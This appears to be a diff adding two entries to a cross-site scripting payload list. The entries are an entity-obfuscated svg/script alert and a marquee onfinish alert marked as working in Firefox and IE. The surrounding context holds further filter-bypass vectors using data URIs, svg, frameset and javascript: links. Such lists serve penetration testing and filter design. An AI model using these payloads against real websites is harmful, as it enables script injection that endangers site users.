@@ -23,6 +23,8 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgiYnkgc3RydWt0Iik8L3NjcmlwdD4=  //alert(
 
 <svg </onload ="1> (_=alert,_(1337)) ""> 
 
+<svg><x><script>alert&#40;7&#41</x>
+
 "xxxxxxxx'yyyyy</img 
 
 <svg><x><script>alert&#40;1&#41</x>
@@ -40,6 +42,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgiYnkgc3RydWt0Iik8L3NjcmlwdD4=  //alert(
 <frameset onload=alert(1)> 
 <ahref=javascript&colon;confirm(1);>click</a>
 <iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">
+<marquee loop=1 width=0 onfinish=alert(1)> // FF and IE only
                                                        
 /*To bypass input values*/
 
